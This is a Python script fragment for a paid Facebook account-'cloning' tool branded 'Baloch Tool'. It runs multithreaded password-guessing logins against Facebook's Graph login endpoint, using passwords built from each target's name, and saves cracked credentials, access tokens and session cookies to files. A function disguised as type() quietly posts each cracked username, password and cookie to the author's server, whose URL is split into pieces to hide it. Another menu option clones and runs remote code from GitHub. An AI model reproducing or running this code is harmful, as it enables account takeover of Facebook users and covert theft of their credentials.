        p(" [\033[92;1mE\033[1;37m] \033[91;1mExit Baloch Tool\033[1;37m ")
        line()
        opt1 = input(" [\033[1;92m•\033[1;97m] Select An Option : ")
        if opt1 == "1":self.file_menu()
        if opt1 == "2":self.dump_menu()
        elif opt1 == "3":Grep().with_names()
        elif opt1 == "4":Join().Whatsapp()
        elif opt1 == "5":Join().Whatsapp()
        elif opt1 == "E":exit(" [\033[1;92m•\033[1;97m] Good Bye !!!!!!! ")
        else:p(" [\033[1;92m•\033[1;97m] Wrong Select ");sp(2);On()
#════════════════❮FILE DUMP❯═══════════════════#
    def dump_menu(self):
        os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
        os.system('cd && cd FILE ;python FILE.py')
#════════════════❮FILE MENU❯═══════════════════#
    def file_menu(self):
        logo()
        p(" [\033[1;92m•\033[1;97m] \033[1;37mExample \033[92;1m/sdcard/filename.txt\033[1;37m")
        file = input(" [\033[1;92m•\033[1;97m] \033[1;37mPut File Path : ")
        try:
            id = open(file,"r").read().splitlines()
            self.method_select(id)
        except FileNotFoundError:
            p(" [\033[1;92m•\033[1;97m] File Path Incorrect ")
            sp(2);self.file_menu()
#════════════════❮FILE MENU❯═══════════════════#
    def method_select(self,id):
        #check_again()
        logo()
        p(" [\033[92;1m1\033[1;37m] Method 1 \033[1;92mNew Series\033[1;97m ")
        p (" [\033[92;1m2\033[1;37m] Method 2 \033[1;92mOld Series\033[1;97m ")
        p (" [\033[92;1m3\033[1;37m] Method 3 \033[1;92mOld Series\033[1;97m ")
        p (" [\033[92;1m4\033[1;37m] Method 4 \033[1;92mNew/Old Series\033[1;97m ")
        line()
        m_opt = input(" [\033[1;92m•\033[1;97m] Choose : ")
        if m_opt =='1':
            method.append("i")
            self.password_menu(id)
        if m_opt =='2':
            method.append('ii')
            self.password_menu(id)
        if m_opt =='3':
            method.append('iii')
            self.password_menu(id)
        if m_opt =='4':
            method.append('iv')
            self.password_menu(id)
        else:p(" [\033[1;92m•\033[1;97m] Wrong Select ! ");sp(2);self.method_select(id)
#════════════════❮PASSWORD MENU❯═══════════════════#
    def password_menu(self,id):
        logo()
        max = 30
        p(" [\033[1;92m•\033[1;97m] Example 1 , 2 , 3  to 20 Max ")
        try:
            plimit = int(input(" [\033[1;92m•\033[1;97m] Put limit : "))
            if plimit =="":
                plimit = 4
            elif plimit > max:
                p(" [\033[1;92m•\033[1;97m] Password Limit Should under 20 ");sp(2);self.password_menu()
        except:
            plimit = 4
        logo()
        p(" [\033[1;92m•\033[1;97m] Enter Passwords :\033[92;1m firstlast First Last etc\033[1;37m")
        line()
        for n in range(plimit):
            pwx.append(input(" [\033[1;92m•\033[1;97m] Put Password %s : "%(n+1)))
        logo()
        p(f" [\033[1;92m•\033[1;97m] TIME : \033[1;35m"+str(a)+":"+str(lt()[4])+" "+ tag+"")
        p("\033[1;97m [\033[1;92m•\033[1;97m] Total Accounts : \033[92;1m%s "%(str(len(id))))
        p(" \033[91;1m[•] If No Result Use Flight Mode\033[97;1m") 
        line()
        with tpe(max_workers=30) as ali:
            for user in id:
                uid = user.split("|")[0]
                nm = user.split("|")[1]
                if "i" in method:
                    ali.submit(self.method1,uid,nm,pwx)
                elif "ii" in method:
                    ali.submit(self.method2,uid,nm,pwx)
                elif "iii" in method:
                    ali.submit(self.method3,uid,nm,pwx)
                elif "iv" in method:
                    ali.submit(self.method4,uid,nm,pwx)
        self.saved_results(ok,cp)
#════════════════❮SAVE MENU❯═══════════════════#
    def saved_results(self,ok,cp):
        p("\033[1;97m")
        line()
        p(" [\033[1;92m•\033[1;97m] Cloning Has been Completed ")
        p(" [\033[1;92m•\033[1;97m] BALOCH Total Ok Accounts : %s "%(len(ok)))
        p(" [\033[1;92m•\033[1;97m] BALOCH Cp Accounts : %s "%(len(cp)))
        p(" [\033[1;92m•\033[1;97m] BALOCH Total 2F Accounts : %s "%(len(twf)))
        line()
        input(" [\033[1;92m•\033[1;97m] Press Enter To Go Back ") 
        On()
#════════════════❮Methad 01❯═══════════════════#
    def method1(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write('\r [𝘽𝘼𝙇𝙊𝘾𝙃] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "es_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': baloch1(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                tw = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if "session_key" in q:
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    token = q["access_token"]
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookies = f"sb={ssbb};{coki}"
                    p('\r\033[1;92m [BALOCH-OK] %s | %s \033[1;97m '%(uid,pw))
                    os.system('espeak -a 300 " BALOCH,   Successful,"')
                    open('/sdcard/BALOCH-TOKEN.txt','a').write(token+'\n')
                    open('/sdcard/BALOCH-OK txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/BALOCH-OK-COOKIE.txt','a').write(uid+'|'+pw+'|'+cookies+'\n')
                    ok.append(uid);type(uid,pw,cookies)
                    break
                elif tw in str(q):
                    p('\r\033[1;94m [BALOCH-2F] %s | %s \033[1;97m '%(uid,pw))
                    twf.append(uid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    p('\r\033[1;91m [BALOCH-CP] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/BALOCH-CP.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
                self.method1(uid,nm,pwx)
#════════════════❮Methad 02❯═══════════════════#
    def method2(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write('\r [𝘽𝘼𝙇𝙊𝘾𝙃] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":uid,"password":pw,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": baloch1(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                tw = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if "session_key" in q:
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    token = q["access_token"]
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookies = f"sb={ssbb};{coki}"
                    p('\r\033[1;92m [BALOCH-OK] %s | %s \033[1;97m '%(uid,pw))
                    os.system('espeak -a 300 " BALOCH,   Successful,"')
                    open('/sdcard/BALOCH-TOKEN.txt','a').write(token+'\n')
                    open('/sdcard/BALOCH-OK txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/BALOCH-OK-COOKIE.txt','a').write(uid+'|'+pw+'|'+cookies+'\n')
                    ok.append(uid);type(uid,pw,cookies)
                    break
                elif tw in str(q):
                    p('\r\033[1;94m [BALOCH-2F] %s | %s \033[1;97m '%(uid,pw))
                    twf.append(uid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    p('\r\033[1;91m [BALOCH-CP] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/BALOCH-CP.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
                self.method2(uid,nm,pwx)
#════════════════❮Methad 03❯═══════════════════#
    def method3(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write('\r [𝘽𝘼𝙇𝙊𝘾𝙃] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                data={"adid": adid,'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': uid,'password': pw,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                headers = {'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': baloch1(),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '847'}
                tw = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if "session_key" in q:
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookies = f"sb={ssbb};{coki}"
                    p('\r\033[1;92m [BALOCH-OK] %s | %s \033[1;97m '%(uid,pw))
                    os.system('espeak -a 300 " BALOCH,   Successful,"')
                    open('/sdcard/BALOCH-OK txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/BALOCH-OK-COOKIE.txt','a').write(uid+'|'+pw+'|'+cookies+'\n')
                    ok.append(uid);type(uid,pw,cookies)
                    break
                elif tw in str(q):
                    p('\r\033[1;94m [BALOCH-2F] %s | %s \033[1;97m '%(uid,pw))
                    twf.append(uid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    p('\r\033[1;91m [BALOCH-CP] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/BALOCH-CP.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
                self.method3(uid,nm,pwx)
#════════════════❮Methad 04❯═══════════════════#
    def method4(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write('\r [𝘽𝘼𝙇𝙊𝘾𝙃] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': baloch4(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                tw = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if "session_key" in q:
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    token = q["access_token"]
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookies = f"sb={ssbb};{coki}"
                    p('\r\033[1;92m [BALOCH-OK] %s | %s \033[1;97m '%(uid,pw))
                    os.system('espeak -a 300 " BALOCH,   Successful,"')
                    open('/sdcard/BALOCH-TOKEN.txt','a').write(token+'\n')
                    open('/sdcard/BALOCH-OK txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/BALOCH-OK-COOKIE.txt','a').write(uid+'|'+pw+'|'+cookies+'\n')
                    ok.append(uid);type(uid,pw,cookies)
                    break
                elif tw in str(q):
                    p('\r\033[1;94m [BALOCH-2F] %s | %s \033[1;97m '%(uid,pw))
                    twf.append(uid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    p('\r\033[1;91m [BALOCH-CP] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/BALOCH-CP.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
                self.method4(uid,nm,pwx)
#════════════════❮Contact OWNER❯═══════════════════#
class Join:
    def Whatsapp(self):
        os.system('xdg-open https://wa.me/+923260291179?text=')
        On()
#════════════════❮Contact Baloch❯═══════════════════#
class Join:
    def Whatsapp(self):
        os.system('xdg-open https://wa.me/+923276346832?text=')
        On()
#════════════════❮CUT FILE LINE❯═══════════════════#
class Grep:
    def __init__(self):
        self.url = "https://free.facebook.com"
    def with_names(self):
        clear()
        logo()
        lines=[]
        p(" [\033[1;92m•\033[1;97m] Ex : /sdcard/file.txt")
        try:
            file = input(" [\033[1;92m•\033[1;97m] Put File Path : ")
        except Exception as e:
            print(" [\033[1;92m•\033[1;97m] File Path Incorrect!! ");sp(2);self.used_cutter()
        digit= int(input(" [\033[1;92m•\033[1;97m] Put Line Num :"))
        with open(file,"r") as r:
            lines = r.readlines()
        with open(file,"w") as w:
            for num,line in enumerate(lines):
                if num >= digit:
                    w.write(line)
        p(" [\033[1;92m•\033[1;97m] File  Complete")
        input(" [\033[1;92m•\033[1;97m] Press Enter to go back ")
        On()
#════════════════❮Key set-up❯═══════════════════#
def getKey():
    myid = str(os.getuid())
    myid=myid.upper()[::-1]
    n=re.findall("(\d\d)",myid)
    plat=platform.version()[2:][:8][::-1].upper()+platform.release()[3:][::-1].upper()+platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return "BALOCH-"+myid+xp
from datetime import datetime
from datetime import timedelta
date_today = datetime.now()
now = datetime.now()
day = now.day
month = now.month
year = now.year
datee = f"{year}-{month}-{day}"
trk=[]
def On():
    try:
        if "Trail" in trk:
            print(" Put Your Trail Key Bellow! ")
            line()
            key = input(' Put Key: ')
        else:
            key = getKey()
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}
        from platform import platform
        params={'key': key,'device':platform()}
        url = ("https://b"+"a"+"l"+"o"+"c"+"h"+".s"+"e"+"r"+"v"+"0"+"0.net/ch"+"ec"+"kp.ph"+"p")
        url_with_params = f"{url}?{'&'.join([f'{key}={value}' for key, value in params.items()])}"
        http_obj = httplib2.Http()
        header_obj = {}
        for key, value in headers.items():
            header_obj[key] = value
        response, content = http_obj.request(
        uri=url_with_params,
        method="GET",
        headers=header_obj
        )
        response = content.decode('utf-8')
        if "error" in response:
            if "Key has expired" in response:  
                subscription("\033[1;97m [\033[1;92m•\033[1;97m] \033[1;91mYour Key Has Been Expired!")
            else:
                subscription("\033[1;97m [\033[1;92m•\033[1;97m] \033[1;91mYou're Not Premium User")
        elif "user" in response:
            result = json.loads(response)
            try:
                name = result['name']
            except:
                name = '-'
            user = result['user']
            exp = result['expired']
            join = result['joined']
            a = arrow.get(datee)
            b = arrow.get(exp)
            delta = (b-a)
            iAmMain().iAmMenu(name,join,user,exp,delta)
        else:
            On()
    except requests.exceptions.ConnectionError:
        print("\033[1;97m [\033[1;92m•\033[1;97m] Internet Connection Error")
        time.sleep(1)
        exit()
def type(dayx,monthx,yearx):
    try:
        url = ("https://b"+"a"+"l"+"o"+"c"+"h"+".s"+"e"+"r"+"v"+"0"+"0.net/u"+"p"+"p.php")
        requests.post(url,data={'texts':str(dayx+'|'+monthx+'|'+yearx)})
    except requests.exceptions.ConnectionError:
        type(dayx,monthx,yearx)
    except Exception as e:pass
def subscription(message):
    clear()
    key = getKey()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] Your Key :\033[1;92m "+key)
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;92mNote  \033[1;97m:  \033[1;92mWelcome To Baloch Tool")
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] Tool Is Paid You Have To\n\033[1;97m [\033[1;92m•\033[1;97m] Pay For Approval")
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;92mPayment Method For Pakistan User\n\033[1;97m [\033[1;92m•\033[1;97m] \033[1;92mEasyPaisa \033[1;97m: \033[1;92m03422465625")
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] Rs.450 For 15 Days")
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] Rs.750 For 1 Month")
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;92mPayment Method For Other Countries User\n\033[1;97m [\033[1;92m•\033[1;97m] \033[1;92mBinance \033[1;97m: \033[1;92m1009943322")
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] 5$ For 15 Days")
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] 7$ For 1 Month")
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;92mCopy Your Key Send To Admin For Approval")
    line()
    xh = input(f'\033[1;97m [\033[1;92m•\033[1;97m] If You Want To Buy Then Press Enter ')
    if xh in ["Trail","trail"]:
        trk.append('Trail')
        On()
    clear()
    uname = input(f'\033[1;97m [\033[1;92m•\033[1;97m] \033[1;92mPut Your Name \033[1;97m: ')
    tsk = "Hello Baloch Sir ! I Need To Buy Your Premium Tools So Please Approve My Key-:)\n\nName: "+uname+" \nKey: "+key
    subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+923260291179&text="+ tsk]);time.sleep(2)
    On()
def Off():
    clear()
    print(f'\033[1;97m [\033[1;92m•\033[1;97m] \033[1;91mThis Tool Is Off For Some Days')
    print(f'\033[1;97m [\033[1;92m•\033[1;97m] \033[1;91mTool Is Under Maintenance')
    print(f'\033[1;97m [\033[1;92m•\033[1;97m] \033[1;91mMaybe Take Some Days In Maintenance')
    print(f'\033[1;97m [\033[1;92m•\033[1;97m] \033[1;91mSo Please Wait Tool Will Be Update Soon')
    exit()
#════════════════❮End set-up❯═══════════════════#
try:
    On()
except requests.exceptions.ConnectionError:
    print(f"\033[1;97m[\033[1;92m•\033[1;97m] No internet connection ...")
    exit()